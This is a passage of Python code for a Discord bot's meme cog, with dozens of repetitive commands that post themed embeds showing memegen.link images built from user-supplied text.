        embed.set_image(url=f"""https://api.memegen.link/images/chosen/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="cmm <Text 1> <Text 2>", description="Change My Mind")
    async def cmm(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Change My Mind""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/cmm/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="crazypills <Text 1> <Text 2>", description="I Feel Like I'm Taking Crazy Pills")
    async def crazypills(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Feel Like I'm Taking Crazy Pills""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/crazypills/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="cryingfloor <Text 1> <Text 2>", description="Crying on Floor")
    async def cryingfloor(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Crying on Floor""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/cryingfloor/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="db <Text 1> <Text 2>", description="Distracted Boyfriend")
    async def db(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Distracted Boyfriend""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/db/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="dg <Text 1> <Text 2>", description="Distracted Girlfriend")
    async def dg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Distracted Girlfriend""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/dg/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="disastergirl <Text 1> <Text 2>", description="Disaster Girl")
    async def disastergirl(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Disaster Girl""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/disastergirl/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="dodgson <Text 1> <Text 2>", description="See? Nobody Cares")
    async def dodgson(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""See? Nobody Cares""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/dodgson/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="dogeimg <Text 1> <Text 2>", description="Doge")
    async def dogeimg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Doge""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/doge/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="drake <Text 1> <Text 2>", description="Drake meme")
    async def drake(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Drakeposting""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/drake/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ds <Text 1> <Text 2>", description="Daily Struggle meme")
    async def ds(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Daily Struggle""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ds/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="dsm <Text 1> <Text 2>", description="Dating Site Murderer")
    async def dsm(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Dating Site Murderer""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/dsm/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="dwight <Text 1> <Text 2>", description="Schrute Facts")
    async def dwight(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Schrute Facts""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/dwight/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="elf <Text 1> <Text 2>", description="You Sit on a Throne of Lies")
    async def elf(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""You Sit on a Throne of Lies""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/elf/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ermg <Text 1> <Text 2>", description="Ermahgerd")
    async def ermg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Ermahgerd""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ermg/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fa <Text 1> <Text 2>", description="Forever Alone")
    async def fa(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Forever Alone""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fa/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="facepalm <Text 1> <Text 2>", description="Facepalm")
    async def facepalm(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Facepalm""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/facepalm/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fbf <Text 1> <Text 2>", description="Foul Bachelor Frog")
    async def fbf(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Foul Bachelor Frog""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fbf/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="feelsgood <Text 1> <Text 2>", description="Feels Good")
    async def feelsgood(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Feels Good""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/feelsgood/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fetch <Text 1> <Text 2>", description="Stop Trying to Make Fetch Happen")
    async def fetch(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Stop Trying to Make Fetch Happen""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fetch/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fine <Text 1> <Text 2>", description="This is Fine")
    async def fine(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""This is Fine""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fine/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="firsttry <Text 1> <Text 2>", description="First Try!")
    async def firsttry(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""First Try!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/firsttry/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fmr <Text 1> <Text 2>", description="Fuck Me, Right?")
    async def fmr(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Fuck Me, Right?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fmr/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fry <Text 1> <Text 2>", description="Fry meme")
    async def fry(ctx, text1: str="", text2: str=""):
